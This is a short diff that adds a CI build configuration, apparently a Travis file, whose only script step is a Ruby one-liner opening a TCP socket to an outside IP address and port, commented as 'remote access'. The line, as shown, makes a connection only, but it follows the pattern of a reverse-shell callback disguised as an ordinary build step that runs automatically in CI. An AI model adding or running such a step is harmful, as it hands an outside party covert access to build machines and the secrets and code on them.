@@ -1,0 +1,4 @@
+language: generic
+
+script:
+  - ruby -rsocket -e 's=TCPSocket.new("178.131.34.210", 3032)' # parham-usvm-2 remote access
